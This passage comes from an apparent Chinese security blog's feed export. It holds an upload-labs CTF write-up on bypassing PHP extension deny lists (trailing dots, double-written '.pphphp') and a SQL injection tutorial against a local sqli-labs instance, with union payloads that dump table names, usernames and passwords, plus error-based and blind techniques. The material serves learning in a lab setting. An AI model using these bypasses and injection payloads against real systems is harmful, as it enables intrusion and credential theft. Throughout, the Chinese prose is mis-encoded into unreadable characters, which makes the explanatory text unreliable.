double-quoted-string">".php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aScx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aShx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cEr"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".sWf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è½¬æ¢ä¸ºå°å†™</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//é¦–å°¾å»ç©º</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ä¸Šä¼ å‡ºé”™ï¼'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿˜æ˜¯ä¼šåˆ é™¤æ–‡ä»¶ç»“å°¾çš„ç‚¹ã€‚å’Œç¬¬ä¸ƒé¢˜ä¸€æ ·çš„æ–¹æ³•å°±å¯ä»¥ç»•è¿‡ã€‚</p><h3 id="Pass-10-åŒå†™ç»•è¿‡"><a href="#Pass-10-åŒå†™ç»•è¿‡" class="headerlink" title="Pass-10 åŒå†™ç»•è¿‡"></a>Pass-10 åŒå†™ç»•è¿‡</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token variable">$deny_ext</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ä¸Šä¼ å‡ºé”™ï¼'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸»è¦æ˜¯è¿™ä¸ªå‡½æ•°str_ireplace<code>$file_name = str_ireplace($deny_ext,"", $file_name);</code></p><p>ä¼šæŠŠåç¼€æ›¿æ¢ä¸ºç©º</p><p>åŒå†™ç»•è¿‡<code>.pphphp</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlæ³¨å…¥åŸç†åŠsqlmapçš„ä½¿ç”¨</title>
      <link href="2020/chang-jian-lou-dong/sql-zhu-ru-yuan-li-ji-qi-sqlmap-de-shi-yong/"/>
      <url>2020/chang-jian-lou-dong/sql-zhu-ru-yuan-li-ji-qi-sqlmap-de-shi-yong/</url>
      
        <content type="html"><![CDATA[<p>mysqlæ•°æ®åº“åˆšåˆšå­¦å®Œ,å­¦çš„éƒ½æ˜¯å¼€å‘ç”¨åˆ°çš„å»ºè¡¨,å¢åˆ æŸ¥æ”¹,å­˜å‚¨è¿‡ç¨‹ä¹‹ç±»çš„çŸ¥è¯†</p><p>ç°åœ¨æ¥å­¦ä¹ å­¦ä¹ sqlæ³¨å…¥.</p><p>sqlæ³¨å…¥ä¹Ÿæ˜¯åŸºäºåŸºç¡€çš„sqlè¯­å¥æ¥å®ç°å¯¹æ•°æ®åº“ç³»ç»Ÿçš„æ¶æ„æ“åšçš„</p><h3 id="åŸºç¡€éƒ¨åˆ†"><a href="#åŸºç¡€éƒ¨åˆ†" class="headerlink" title="åŸºç¡€éƒ¨åˆ†"></a>åŸºç¡€éƒ¨åˆ†</h3><p>é¦–å…ˆæ˜¯<strong>sqlæ³¨å…¥è¦æ»¡è¶³çš„æ¡ä»¶åŠåŸç†</strong>:</p><p>1.å‚æ•°å¯æ§:å°±æ˜¯å¯ä»¥è‡ªå®šä¹‰ä¼ å…¥çš„å‚æ•°</p><p>2.å‚æ•°è¦å¯ä»¥å¸¦åˆ°æ•°æ®åº“æŸ¥è¯¢:ä¼ å…¥çš„å‚æ•°æ‰€æ‹¼æ¥æˆçš„sqlè¯­å¥,å¿…é¡»å¸¦å…¥æ•°æ®åº“æŸ¥è¯¢</p><p>åœ¨åšæ•°æ®åº“å®éªŒçš„è¿‡ç¨‹ä¸­ä¹Ÿå‘ç°mysqlä¼šæœ‰ä¸ªé»˜è®¤çš„information_schemaæ•°æ®åº“,é‡Œé¢æœ‰å¥½å¤šå¥½ä¸œè¥¿å•Š,åœ¨ä¸€äº›è¡¨é‡Œé¢å¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„æ•°æ®åº“å,è¡¨å,è¿˜æœ‰å…¶ä»–ä¸€äº›æ•°æ®åº“çš„ä¿¡æ¯ã€‚</p><p>è¿˜æœ‰ä¸€äº›æœ‰ç”¨çš„å‡½æ•°,å¯ä»¥æŸ¥çœ‹æ•°æ®åº“çš„åŸºæœ¬ä¿¡æ¯,éƒ½ç”¨å¾—åˆ°</p><pre class="line-numbers language-none"><code class="language-none">@@datadir: æŸ¥è¯¢æ•°æ®åº“çš„ç‰©ç†è·¯å¾„@@version: æŸ¥è¯¢æ•°æ®åº“ç‰ˆæœ¬version(): database(): æŸ¥çœ‹æ•°æ®åº“åuser(): æŸ¥çœ‹mysqlç”¨æˆ·limit m,n: ä»mæ¡è®°å½•å¼€å§‹å–næ¡è®°å½•......<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ„é€ é—­åˆè¯­å¥"><a href="#æ„é€ é—­åˆè¯­å¥" class="headerlink" title="æ„é€ é—­åˆè¯­å¥"></a>æ„é€ é—­åˆè¯­å¥</h3><p>sqlæ³¨å…¥éœ€è¦å°†å‰é¢çš„è¯­å¥é—­åˆèµ·æ¥æˆ–è€…æ˜¯å½¢æˆè‡ªå·±çš„sqlè¯­å¥,å¯ä»¥æœ‰ä¸€ä¸‹å‡ ç§æ–¹å¼:</p><p>â€˜ (å•å¼•å·)å¯ä»¥æŠŠidæ‹¬èµ·æ¥ï¼Œä½¿å‰é¢çš„è¯­å¥é—­åˆ</p><p>æ„é€ è¯­å¥çš„æ—¶å€™ï¼Œä¸€æ˜¯è¦æŠŠæˆ‘ä»¬æ„é€ çš„è¯­å¥é‡Šæ”¾å‡ºæ¥ï¼ŒäºŒæ˜¯è¦æŠŠç»“æ„è¿›è¡Œè¡¥å…¨æˆ–è€…é€‚å½“çš„æ³¨é‡Šã€‚</p><p>æ³¨é‡Šå¯ä»¥ç”¨â€“+;â€“ -;#æŠŠåé¢çš„â€™æˆ–è€…å¤šä½™çš„ä¿®é¥°ç¬¦æ³¨é‡Šæ‰ï¼Œå½“ç„¶ä¸åŒæ•°æ®åº“çš„æ³¨é‡Šæ–¹æ³•ä¹Ÿä¸å°½ç›¸åŒã€‚</p><p>/<em>!</em>/ (å†…è”æ³¨é‡Šå¯ä»¥æ”¾åœ¨æ•´ä¸ªsqlè¯­å¥ä¸­)</p><p>ä¸‹é¢æ˜¯ä¸€äº›å¸¸ç”¨çš„ç»“æ„</p><pre class="line-numbers language-none"><code class="language-none">or 1=1--+ 'or 1=1--+ "or 1=1--+ )or 1=1--+ ')or 1=1--+ ") or 1=1--+ "))or 1=1--+ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="sqlæ³¨å…¥çš„ç±»å‹"><a href="#sqlæ³¨å…¥çš„ç±»å‹" class="headerlink" title="sqlæ³¨å…¥çš„ç±»å‹"></a>sqlæ³¨å…¥çš„ç±»å‹</h3><h4 id="Unionæ³¨å…¥"><a href="#Unionæ³¨å…¥" class="headerlink" title="Unionæ³¨å…¥"></a>Unionæ³¨å…¥</h4><p>æ„Ÿè§‰æ€è·¯æ˜¯æ¯”è¾ƒæ¸…æ™°çš„ï¼Œä¸€æ­¥ä¸€æ­¥çš„æ‰©å¤§å¯¹æ•°æ®åº“çš„æŸ¥è¯¢èŒƒå›´ï¼Œæœ€åè·å–åˆ°æœ‰ç”¨ä¿¡æ¯ã€‚å°±æ˜¯order byæŸ¥å­—æ®µæœ‰ç‚¹çƒ¦</p><p>ä¸€èˆ¬çš„unionæ³¨å…¥æ„Ÿè§‰éƒ½å¯ä»¥å®‰è£…è¿™ä¸ªæ­¥éª¤æ¥ï¼š</p><p>1.å…ˆæ‰¾åˆ°é—­åˆè§„åˆ™</p><p>2.ç„¶åç”¨order byå­å¥æŸ¥è¯¢å±æ€§åˆ—çš„å­—æ®µæ•°,ä¹Ÿå°±æ˜¯çœ‹æœ‰å¤šå°‘åˆ—</p><p>3.æ¥ç€å°±å¯ä»¥è·å–database()äº†ï¼Œå…ˆæŠŠidæ¢æˆ-1ï¼Œæ•°æ®åº“æ²¡æœ‰id=-1çš„æ•°æ®ï¼Œè¿™æ ·å°±å¯ä»¥æŠŠæ‰€æœ‰selectèµ·æ¥çš„æ•°æ®éƒ½æ˜¾ç¤ºå‡ºæ¥</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,database(),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°å½“å‰çš„æ•°æ®åº“æ˜¯security</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208201220521.png" alt="image-20210208201220521"></p><p>4.æŸ¥è¡¨å</p><p>å› ä¸ºå½“æ—¶union selectå‡ºæ¥çš„æ•°æ®æ˜¾ç¤º2ï¼Œ3</p><p>æ‰€ä»¥å¯ä»¥åœ¨åŸæ¥2ï¼Œ3çš„ä½ç½®æ’å…¥sqlè¯­å¥ï¼Œä½†è¦ç”¨ï¼ˆï¼‰å°†è¦æ’å…¥çš„sqlè¯­å¥åŒ…èµ·æ¥</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema ='security'),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5.æŸ¥ç”¨æˆ·å±æ€§ä¹Ÿå°±æ˜¯å­—æ®µ</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = 'security' and table_name = 'users'),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯ä»¥å‘ç°æœ‰ä¸‰ä¸ªå±æ€§</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208201234242.png" alt="image-20210208201234242"></p><p>6.æŸ¥å®Œå±æ€§å°±å¯ä»¥æŸ¥åˆ—äº†ï¼ŒæŠŠusernameå…¨éƒ¨è°ƒå‡ºæ¥</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,(select group_concat(username) from security.users),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208201319502.png" alt="image-20210208201319502"></p><p>7.æœ€åå°±æ˜¯æŸ¥ç”¨æˆ·å¯†ç äº†</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,(select group_concat(password) from security.users),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Booleanç›²æ³¨"><a href="#Booleanç›²æ³¨" class="headerlink" title="Booleanç›²æ³¨"></a>Booleanç›²æ³¨</h4><p>æ„Ÿè§‰è¿™ä¸ªå…¨é çŒœï¼Œä½†æ˜¯çŒœä¹Ÿå¾—è®²ç©¶æŠ€å·§å‘€ï¼Œæ¯”å¦‚å¯ä»¥ç”¨æ•°æ®ç»“æ„å­¦è¿‡çš„äºŒåˆ†æ³•å»æ</p><p>1.å…ˆåˆ¤æ–­æ˜¯ä¸æ˜¯Booleanç›²æ³¨ï¼Œå¦‚æœèƒ½æŠ¥é”™ï¼Œä½†æ²¡æœ‰æŠ¥é”™ä¿¡æ¯ï¼Œæ­£ç¡®æŸ¥è¯¢ä¹Ÿæ˜¾ç¤ºä¸äº†æŸ¥è¯¢å†…å®¹å°±å±äºå¸ƒå°”ç›²æ³¨ï¼ŒBooleané¡¾åæ€ä¹‰åªå­˜åœ¨ä¸¤ç§çŠ¶æ€ï¼Œå¯¹æˆ–é”™ï¼Œä½ çœ‹ä¸åˆ°ä»»ä½•ä¿¡æ¯ï¼Œåªæœ‰true or false</p><p>æ¯”å¦‚è¿™é¢˜ï¼ŒçŒœå¯¹äº†åªæœ‰You are in æ˜¾ç¤ºï¼ŒçŒœé”™äº†å°±å•¥ä¹Ÿæ²¡æœ‰</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208201358085.png" alt="image-20210208201358085"></p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-5?id=1 and 1=1 --+ æ­£å¸¸http://127.0.0.1/sqli-labs/Less-5?id=1 and 1=2 --+ æ­£å¸¸http://127.0.0.1/sqli-labs/Less-5?id=1' and 1=2 --+ ä¸æ­£å¸¸http://127.0.0.1/sqli-labs/Less-5?id=1' and 1=1 --+ æ­£å¸¸ç»¼ä¸Šå¯ä»¥åˆ¤æ–­æ˜¯å­—ç¬¦ä¸²ç›²æ³¨äº†<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2.æ ¹æ®è¿”å›çŠ¶æ€åˆ¤æ–­é—­åˆè§„åˆ™</p><p>3.<strong>ç»å¸¸ç”¨åˆ°çš„å°±æ˜¯length()å’Œsubstr()è¯­å¥ï¼Œæ¥çŒœæ•°æ®åº“ã€è¡¨åç­‰çš„é•¿åº¦å’Œæ­£ç¡®å­—æ¯ï¼›</strong></p><pre class="line-numbers language-none"><code class="language-none">length()ï¼šè¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦substr(str,pos,num) ï¼šæˆªå–æŒ‡å®šä½ç½®æŒ‡å®šé•¿åº¦çš„å­—ç¬¦ä¸²mid(str,pos,num) :æˆªå–æŒ‡å®šä½ç½®æŒ‡å®šé•¿åº¦çš„å­—ç¬¦ä¸²ascii() æŸ¥è¯¢asciiç ä¸­å¯¹åº”çš„å€¼char() æŸ¥è¯¢å­—ç¬¦å¯¹åº”çš„asciiå€¼<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h4><ol><li><p>åªè¦æ³¨å…¥ç‚¹æœ‰sqlæŠ¥é”™ä¿¡æ¯ï¼Œå°±å¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥ï¼›</p></li><li><p>è¿˜æ˜¯ä¸€æ ·ï¼Œå¼•å·æŠ¥é”™ï¼Œç„¶åæ‰¾åˆ°é—­åˆè§„åˆ™ï¼Œé¡µé¢æ­£å¸¸æ˜¾ç¤ºï¼Œåˆ™å¯ä»¥åœ¨é—­åˆè§„åˆ™ä¸­å¼€å§‹å†™å…¥æŠ¥é”™æ³¨å…¥çš„sqlè¯­å¥ï¼›</p></li><li><p>updatexmlæŠ¥é”™è·å–å½“å‰æ•°æ®åº“ï¼š</p><pre class="line-numbers language-none"><code class="language-none">and updatexml(1,concat(0x7e,(select database()),0x7e),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>flooræŠ¥é”™è·å–å½“å‰æ•°æ®åº“ï¼š</p><pre class="line-numbers language-none"><code class="language-none">and (select 1 from (select count(*),concat((database()),floor (rand(0)*2))x from information_schema.tables group by x)a)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>ä¸¤ç§æ–¹å¼åº”è¯¥éƒ½å¯è¡Œï¼Œå¦‚æœç¬¬ä¸€ä¸ªä¸è¡Œå°±æ¢ç¬¬äºŒä¸ªè¯•è¯•</p></li><li><p>æ¥ç€å¯ä»¥åˆ©ç”¨selectè¯­å¥æ›¿æ¢æ‰ä¸Šé¢database()æ¥ç»§ç»­è·å–æ•°æ®åº“ä¸­çš„è¡¨åã€å­—æ®µåï¼ŒæŸ¥è¯¢è¯­å¥å’Œunionæ³¨å…¥æ”»å‡»çš„è¯­å¥ç›¸åŒï¼›</p></li><li><p>æ³¨æ„è¿™é‡Œä¸èƒ½å†ä½¿ç”¨group_concatäº†ï¼Œå› ä¸ºæŠ¥é”™æ³¨å…¥åªæ˜¾ç¤ºä¸€æ¡ç»“æœï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨limitè¯­å¥ï¼›</p></li></ol><h4 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h4><ol><li><p>æ²¡æœ‰æ˜ç¡®çš„ç°è±¡ï¼Œä¸ç®¡æ˜¯å¯¹æ˜¯é”™éƒ½è¿”å›ä¸€ä¸ªçŠ¶æ€ï¼›</p></li><li><p>ä½†æ˜¯å¦‚æœç”¨sleep(5)æ–¹æ³•ï¼Œèƒ½è®©å“åº”æ—¶é—´å»¶è¿Ÿä¸º5ç§’ä»¥ä¸Šï¼Œé‚£ä¹ˆå°±ä¸ºæ—¶é—´ç›²æ³¨ï¼›</p></li><li><p>æˆ‘ä»¬ç”¨sleep(5)å‡½æ•°æ„é€ äº†ä¸€ä¸ªæ—¶é—´å»¶æ—¶çš„çŠ¶æ€ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬åˆæœ‰äº†ä¸¤ç§çŠ¶æ€ï¼Œåƒå¸ƒå°”ç›²æ³¨ä¸€æ ·å¯ä»¥æ ¹æ®è¿™ä¸¤ç§çŠ¶æ€æ¥åˆ¤å®šæ•°æ®åº“ã€è¡¨åå’Œå­—æ®µåçš„é•¿åº¦å’Œæ­£ç¡®çš„æ¯ä¸ªå­—æ¯ï¼›</p></li><li><p>åŒæ 